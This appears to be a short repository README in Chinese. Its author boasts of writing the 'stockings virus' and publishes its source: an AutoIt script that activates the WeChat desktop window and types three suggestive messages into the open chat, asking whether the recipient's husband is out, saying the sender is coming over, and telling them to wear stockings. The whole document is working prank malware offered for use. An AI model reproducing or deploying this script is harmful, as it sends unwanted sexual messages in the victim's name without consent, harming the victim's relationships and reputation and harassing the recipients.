# siwa
不装了，那丝袜病毒是我写的

现在已经公开源代码

WinActivate("[CLASS:WeChatMainWndForPC]") 
Sleep(10)
If WinActive("[CLASS:WeChatMainWndForPC]") Then ; 
	Send("你老公出门了吗")
	Send("{ENTER}")
	Send("等下我去你家")
	Send("{ENTER}")
	Send("穿丝袜等我")
	Send("{ENTER}")
EndIf
